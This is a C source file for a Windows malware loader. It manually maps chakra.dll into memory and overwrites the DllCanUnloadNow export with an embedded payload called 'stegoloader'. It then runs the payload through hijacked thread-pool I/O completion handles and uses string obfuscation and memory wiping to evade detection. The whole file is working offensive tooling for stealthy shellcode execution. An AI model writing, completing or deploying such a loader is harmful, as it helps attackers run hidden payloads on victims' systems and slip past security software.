#include <windows.h>
#include "shellcode.h"
#include "manual_mapper.h"
#include "pooling.h"
#include "string_obf.h"
#define ENABLE_DLLMAIN 0
#define ENABLE_PEB_INSERTION 1

DllCanUnloadNowFn stomped_fn;
HANDLE global_mutex;

__declspec(naked) DWORD WINAPI ShellcodeWrapper() {
   __asm__ __volatile__ (
        ".intel_syntax noprefix\n"
        "mov rdi, %[global]\n"        // rdi = &stomped_fn
        "mov rdi, [rdi]\n"            // rdi = *rdi (actual function pointer)
        "sub rsp, 0x28\n"
        "call rdi\n"
        "add rsp, 0x28\n"
        "xor eax, eax\n"
        "ret\n"
        ".att_syntax prefix\n"
        :
        : [global] "r" (&stomped_fn)
        : "rdi", "rsp", "rax"
    );
}
void WINAPI executer()
{
	WaitForSingleObject(global_mutex, INFINITE);
	printf("ready to call stomped function\n");
	
	HANDLE hWorkerFactory = getHandle(WOBF_TPWORKERFACTORY, GetCurrentProcess());//), WORKER_FACTORY_ALL_ACCESS);
    if (!hWorkerFactory) {
        printf("[-] No worker factory found in process\n");
        return -1;
    }
	printf("TpWorkerFactory done\n");
    HANDLE IRTimer = getHandle(WOBF_IRTIMER, GetCurrentProcess());// , TIMER_ALL_ACCESS);
    if (!hWorkerFactory) {
       printf("[-] No timer threads found in process\n");
        return -1;
    }
	printf("IRTimer done\n");
    HANDLE hIoCompletion = getHandle(WOBF_IOCOMPLETION, GetCurrentProcess());// , IO_COMPLETION_ALL_ACCESS);
    if (!hIoCompletion) {
        printf("[-] No thread pools found in process\n");
        return -1;
    }
	ExecuteDirectIO(GetCurrentProcess(), hIoCompletion,ShellcodeWrapper);
}

void WINAPI loader()
{
	//should call main, then  release mutex when done
	FILE* f = fopen(OBF("C:\\Windows\\System32\\chakra.dll"), "rb");
    if (!f) {
       printf("[-] could not open chakra.dll\n");
        return -1;
    }
	
    fseek(f, 0, SEEK_END);
    SIZE_T size = ftell(f);
    fseek(f, 0, SEEK_SET);

    BYTE* buffer = malloc(size);
    fread(buffer, 1, size, f);
    fclose(f);
  printf("[*] Read %llu bytes from file\n", (unsigned long long)size);

    MANUAL_MODULE mod = LoadDllFromMemory(buffer, WOBF_CHAKRA_DLL);
	custom_secure_zero_memory(buffer,size);
    if (!mod.image_base) {
        printf("[-] could not manually map chakra\n");
        return -1;
    }
		
	free(buffer);
	stomped_fn =(DllCanUnloadNowFn) GetExportByName(mod.image_base, OBF("DllCanUnloadNow"));
    if (!stomped_fn) {
        printf("[-] error referencing target symbol \n");
        return -1;
    }
	if (StompExport(mod.image_base, OBF("DllCanUnloadNow"), stegoloader_bin, stegoloader_bin_len)) {
		printf("[+] stomped_fn was propperly stomped\n");
	} else {
		printf("[-] failed to stomp stomped_fn\n");
	}
	SetEvent(global_mutex);
}		
__declspec(dllexport) void ChakraEngine() {
    main();
}

int main() {
	global_mutex=CreateEvent(NULL, TRUE, FALSE, NULL); // Manual-reset event, initially not signaled
	HANDLE hThread1 = CreateThread(NULL, 0, executer, NULL, 0, NULL);
    HANDLE hThread2 = CreateThread(NULL, 0, loader, NULL, 0, NULL);
	
	
	HANDLE hEvent = CreateEvent(NULL, TRUE, FALSE, NULL); // Manual reset, initially nonsignaled
	DWORD waitResult = WaitForSingleObject(hEvent, INFINITE); // Wait with a timeout
	return 0;
}



BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH: {
		break;
	}
	case DLL_THREAD_ATTACH:
		break;

	case DLL_THREAD_DETACH:
		break;

	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}